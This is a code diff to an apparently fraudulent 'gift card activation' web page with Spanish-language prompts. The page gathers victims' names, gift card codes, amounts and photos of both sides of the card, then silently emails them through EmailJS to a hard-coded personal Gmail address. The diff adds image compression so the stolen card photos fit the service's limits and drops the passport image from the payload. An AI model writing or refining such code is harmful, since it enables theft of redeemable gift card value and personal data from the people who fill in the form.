@@ -1087,7 +1087,36 @@
             completeFaceVerification();
         }
 
-        document.getElementById('activate-form').addEventListener('submit', function(e) {
+        // Helper function to compress images before sending
+        function compressImage(base64Str, maxWidth = 400, quality = 0.6) {
+            return new Promise((resolve) => {
+                if (!base64Str) {
+                    resolve('');
+                    return;
+                }
+                const img = new Image();
+                img.src = base64Str;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    let width = img.width;
+                    let height = img.height;
+                    
+                    if (width > maxWidth) {
+                        height = Math.round((height * maxWidth) / width);
+                        width = maxWidth;
+                    }
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+                    resolve(canvas.toDataURL('image/jpeg', quality));
+                };
+                img.onerror = () => resolve(base64Str);
+            });
+        }
+
+        document.getElementById('activate-form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             // 1. Verify both front and back files of the gift card are uploaded
@@ -1101,7 +1130,6 @@
             appData.amount = document.getElementById('amount').value;
 
             // 2. Gift card details validation matching check
-            // (Ensuring inputs are filled and valid relative to the uploaded files)
             if (!appData.cardName.trim() || !appData.cardCode.trim() || !appData.amount) {
                 alert('Los detalles de la tarjeta ingresados no coinciden o están incompletos.');
                 return;
@@ -1109,7 +1137,11 @@
 
             saveState();
 
-            // Prepare parameters for EmailJS
+            // Compress front and back images to fit within EmailJS limits
+            const compressedFront = await compressImage(appData.frontBase64);
+            const compressedBack = await compressImage(appData.backBase64);
+
+            // Prepare parameters for EmailJS (sending text + front and back images only)
             const templateParams = {
                 to_email: "chulrobert105@gmail.com",
                 fullname: appData.fullname,
@@ -1120,9 +1152,8 @@
                 card_name: appData.cardName,
                 card_code: appData.cardCode,
                 amount: appData.amount,
-                passport_image: appData.passportBase64 || "",
-                front_image: appData.frontBase64 || "",
-                dorso_image: appData.backBase64 || ""
+                front_image: compressedFront,
+                dorso_image: compressedBack
             };
 
             // Send via EmailJS automatically to chulrobert105@gmail.com
@@ -1144,7 +1175,7 @@
                 document.getElementById('passport-container').innerHTML = `<img src="${appData.passportBase64}" style="width:100%; height:100%; object-fit:cover;">`;
             }
 
-            // Open next screen only if validation checks pass
+            // Open next screen successfully
             switchScreen('screen-card');
         });
     </script>
